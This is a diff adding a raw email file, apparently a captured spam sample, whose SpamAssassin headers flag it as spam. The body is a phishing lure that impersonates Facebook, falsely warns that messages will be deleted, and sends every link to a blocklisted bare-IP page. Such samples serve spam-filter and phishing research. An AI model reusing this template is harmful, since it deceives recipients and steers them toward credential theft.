@@ -1,0 +1,104 @@
+Return-Path: <mqgrvpw@prcc.edu>
+X-Spam-Checker-Version: SpamAssassin 3.3.2 (2011-06-06) on www546b.sakura.ne.jp
+X-Spam-Flag: YES
+X-Spam-Level: ********
+X-Spam-Status: Yes, score=8.7 required=7.0 tests=BAYES_40,DATE_IN_PAST_06_12,
+	FROM_LOCAL_NOVOWEL,HK_RANDOM_ENVFROM,HK_RANDOM_FROM,HTML_MESSAGE,
+	MIME_HTML_ONLY,NORMAL_HTTP_TO_IP,RAZOR2_CF_RANGE_51_100,
+	RAZOR2_CF_RANGE_E8_51_100,RAZOR2_CHECK,URIBL_WS_SURBL autolearn=no
+	version=3.3.2
+X-Spam-Report: 
+	*  1.0 HK_RANDOM_FROM From username looks random
+	*  0.0 HK_RANDOM_ENVFROM Envelope sender username looks random
+	*  0.5 FROM_LOCAL_NOVOWEL From: localpart has series of non-vowel letters
+	*  1.5 DATE_IN_PAST_06_12 Date: is 6 to 12 hours before Received: date
+	*  1.6 URIBL_WS_SURBL Contains an URL listed in the WS SURBL blocklist
+	*      [URIs: 79.96.49.156]
+	*  0.0 NORMAL_HTTP_TO_IP URI: Uses a dotted-decimal IP address in URL
+	* -0.0 BAYES_40 BODY: Bayes spam probability is 20 to 40%
+	*      [score: 0.3639]
+	*  0.0 HTML_MESSAGE BODY: HTML included in message
+	*  0.7 MIME_HTML_ONLY BODY: Message only has text/html MIME parts
+	*  1.9 RAZOR2_CF_RANGE_E8_51_100 Razor2 gives engine 8 confidence level
+	*      above 50%
+	*      [cf: 100]
+	*  0.5 RAZOR2_CF_RANGE_51_100 Razor2 gives confidence level above 50%
+	*      [cf: 100]
+	*  0.9 RAZOR2_CHECK Listed in Razor2 (http://razor.sf.net/)
+Received: from www546b.sakura.ne.jp (ksav51.sakura.ne.jp [219.94.192.131])
+	by www546b.sakura.ne.jp (8.14.5/8.14.5) with ESMTP id s43LsZh6073673
+	for <hobby.division@sportshobby.co.jp>; Sun, 4 May 2014 06:54:36 +0900 (JST)
+	(envelope-from mqgrvpw@prcc.edu)
+X-Nat-Received: from [112.78.125.46]:23554 [ident-empty]
+	by smtp-proxy.isp with TPROXY id 1399154075.1185
+Received: from localhost ([65.39.143.178])
+	by www546b.sakura.ne.jp (8.14.5/8.14.5) with SMTP id s43LsVQr073665
+	for <hobby.division@sportshobby.co.jp>; Sun, 4 May 2014 06:54:35 +0900 (JST)
+	(envelope-from mqgrvpw@prcc.edu)
+Date: Sat, 3 May 2014 11:32:43 +0000
+To: "hobby.division+sportshobby.co.jp" <hobby.division@sportshobby.co.jp>
+From: Facebook <mqgrvpw@prcc.edu>
+Subject: Your messages will be deleted soon
+Message-ID: <fd57.6fb3da6.d7f95@localhost>
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: 7bit
+X-Anti-Virus: Kaspersky Anti-Virus for Linux Mail Server 5.6.45.2/RELEASE, bases: 03052014 #7841169, status: clean
+
+
+<html>
+ <body style="background:#fff;margin:0px;padding:0px;">
+
+<table cellspacing="0" cellpadding="0" border="0" style="width:620px">
+ <tr>
+  <td bgcolor="#3b5998" style="font-family:tahoma,verdana,arial,sans-serif;font-size:16px;font-weight:bold;color:#ffffff;padding:10px 38px 4px">facebook</td>
+ </tr>
+
+ <tr>
+  <td style="padding:20px 38px;border:solid 1px #cccccc">
+
+   <table cellspacing="0" cellpadding="0" border="0">
+    <tr>
+     <td valign="top" style="padding-right:10px;font-size:0px"></td>
+     <td valign="top" style="font-family:tahoma,verdana,arial,sans-serif;font-size:13px;color:#333333">
+
+You haven't been to Facebook for a few days, and a lot happened while you were away.
+
+<div style="margin:10px 0px;padding:10px 0px;border-top:solid 1px #cccccc">
+
+<a href="http://79.96.49.156/alimony.php" style="font-family:tahoma,verdana,arial,sans-serif;font-size:12px;text-decoration:none;color:#3b5998">Your messages will be deleted soon</a>
+
+</div>
+
+     </td>
+    </tr>
+   </table>
+
+<div style="margin:10px 0px;border-top:solid 1px #cccccc;border-bottom:solid 1px #cccccc;background:#f2f2f2">
+ <table cellspacing="10" cellpadding="0" border="0">
+  <tr>
+   <td><div style="padding:2px 6px 4px;border-width:1px;border-style:solid;border-color:#29447E #29447E #1a356e;background:#5b74a8">
+    <a href="http://79.96.49.156/alimony.php" style="font-family:tahoma,verdana,arial,sans-serif;font-size:13px;font-weight:bold;color:#ffffff;text-decoration:none">View messages</a></div>
+   </td>
+   <td><div style="padding:2px 6px 4px;border-width:1px;border-style:solid;border-color:#999999 #999999 #888888;background:#eeeeee">
+    <a href="http://79.96.49.156/alimony.php" style="font-family:tahoma,verdana,arial,sans-serif;font-size:13px;font-weight:bold;color:#333333;text-decoration:none">Go to Facebook</a></div>
+   </td>
+  </tr>
+ </table>
+</div>
+
+  </td>
+ </tr>
+
+ <tr>
+  <td style="font-family:tahoma,verdana,arial,sans-serif;font-size:11px;color:#999999;padding:10px">
+
+This message was sent to hobby.division@sportshobby.co.jp. If you don't want to receive these emails from Facebook in the future, please <a href="http://79.96.49.156/alimony.php" style="color:#3b5998;text-decoration:none;">unsubscribe</a>.<br />Facebook, Inc. Attention: Department 415 P.O Box 10005 Palo Alto CA 94303
+
+  </td>
+ </tr>
+</table>
+
+</body>
+</html>
+
